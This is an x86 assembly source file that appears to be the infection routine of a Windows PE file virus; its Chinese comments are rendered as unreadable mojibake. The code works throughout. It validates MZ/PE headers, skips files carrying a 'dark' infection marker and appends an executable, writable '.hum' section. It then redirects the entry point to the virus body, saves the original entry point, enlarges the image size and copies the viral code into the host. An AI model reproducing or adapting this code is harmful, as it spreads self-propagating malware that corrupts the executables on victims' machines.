;============================modipe.asm 
;�޸�pe,��ӽ�,ʵ�ִ�Ⱦ���� 
xchg	eax,esi
;eaxΪ���ڴ�ӳ���ļ��е���ʼ��ַ����ָ���ļ��Ŀ�ʼλ��
cmp    word  ptr [esi],'ZM' 
jne    CouldNotInfect 
add    esi,[esi+3ch]        ;ָ��PE_HEADER 
cmp    word  ptr [esi],'EP' 
jne    CouldNotInfect       ;�Ƿ���PE,���򲻸�Ⱦ 
cmp    dword ptr [esi+8],'dark'
je     CouldNotInfect 
mov    [ebp+pe_Header],esi  ;����pe_Headerָ�� 

;���bound import table
push edi
push eax
xor eax,eax
lea edi,[esi+0D0h]
stosd
stosd
pop eax
pop edi


mov    ecx,[esi+74h]        ;�õ�directory����Ŀ 
imul   ecx,ecx,8 
lea    eax,[ecx+esi+78h]    ;data directory  eax->�ڱ���ʼ��ַ 
movzx  ecx,word  ptr [esi+6h];����Ŀ 
imul   ecx,ecx,28h          ;�õ����нڱ�Ĵ�С 
add    eax,ecx              ;�ڽ�β... 
xchg   eax,esi              ;eax->Pe_header,esi->���ڿ�ʼƫ�� 
;************************** 
;������½�: 
;name .hum 
;VirtualSize==ԭsize+VirSize 
;VirtualAddress= 
;SizeOfRawData ���� 
;PointerToRawData
;PointerToRelocations dd 0 
;PointerToLinenumbers dd ?   
;NumberOfRelocations  dw  ?   
;NumberOfLinenumbers  dw  ? 
;Characteristics      dd ? 
;************************** 
mov    dword ptr [esi],'muh.'  ;����.hum 
mov    dword ptr [esi+8],VirusLen ;�ڵ�ʵ�ʴ�С 

;����VirtualSize��V.addr 
mov    ebx,[eax+38h]        ;�ڶ��룬���ڴ��нڵĶ������� 
mov    [ebp+sec_align],ebx
mov    edi,[eax+3ch]        ;�ļ����룬���ļ��нڵĶ�������
mov    [ebp+file_align],edi

mov    ecx,[esi-40+0ch]     ;��һ�ڵ�V.addr 
mov    eax,[esi-40+8]       ;��һ�ڵ�ʵ�ʴ�С 
xor    edx,edx 
div    ebx                  ;���Խڶ��� 
test   edx,edx 
je     @@@1 
inc    eax 
@@@1: 
mul    ebx                  ;��һ�����ڴ��ж����Ľڴ�С 
add    eax,ecx              ;������һ�ڵ�V.addr�����½ڵ���ʼV.addr 
mov    [esi+0ch],eax        ;������sectionƫ��RVA 
add    eax,_Start-vBegin    ;������һ��ִ�д��룬�������ڲ����ڵ���ʼ��
mov    [ebp+newEip],eax     ;�����µ�eip 
mov    dword ptr [esi+24h],0E0000020h    ;������ 
mov    eax,VirusLen         ;����SizeOfRawData�Ĵ�С 
cdq 
div    edi                  ;���㱾�ڵ��ļ����� 
je     @@@2 
inc    eax 
@@@2: 
mul    edi 
mov    dword ptr [esi+10h],eax ;����ڶ����ļ���Ĵ�С
mov    eax,[esi-40+14h] 
add    eax,[esi-40+10h] 

mov    [esi+14h],eax        ;PointerToRawData���� 

mov    [ebp+oldEnd],eax     ;����������HOST�ļ��е�д���...? 

mov    eax,[ebp+pe_Header] 
inc    word  ptr [eax+6h]   ;���½���Ŀ 
mov    ebx,[eax+28h]        ;eipָ��ƫ�� 
;----------------------------------------
mov    [ebp+oldEipTemp],ebx     	;������ָ�� <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
;----------------------------------------
mov    ebx,[ebp+newEip] 
mov    [eax+28h],ebx        ;����ָ��ֵ 
;comment $ 
mov    ebx,[eax+50h]        ;����ImageSize 
add    ebx,VirusLen 
mov    ecx,[ebp+sec_align] 
xor    edx,edx 
xchg   eax,ebx              ;eax��ebx����... 
cdq 
div    ecx 
test   edx,edx 
je     @@@3 
inc    eax 
@@@3: 
mul    ecx 
xchg   eax,ebx              ;��ԭ  eax->pe_Header 
mov    [eax+50h],ebx   
;�����º��Image_Size��С=��ԭImage_size+�������ȣ������ĳ���  
;$ 
mov    dword ptr [eax+8],'dark' ;������Ⱦ��־ֱ��д������Ⱦ�ļ���PEͷ��
cld
mov    ecx,VirusLen
mov    edi,[ebp+oldEnd]
add    edi,[ebp+pMem]
lea    esi,[ebp+vBegin]
rep    movsb                ;����������д��Ŀ���ļ��½��Ľ���! 
;--------------------------------
push   edi    				;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
lea    esi,[ebp+oldEipTemp]		;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
lea    edi,[edi+(oldEip-vEnd)]		;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
movsd					;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
pop    edi				;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<����ӵĴ���
;--------------------------------
xor    eax,eax 
sub    edi,[ebp+pMem] 
push   FILE_BEGIN 
push   eax 
push   edi 
push   [ebp+hFile] 
call   [ebp+aSetFilePointer];�趨�ļ���дָ��
push   [ebp+hFile] 
call   [ebp+aSetEndOfFile]  ; ����ǰ�ļ�λ����Ϊ�ļ�ĩβ
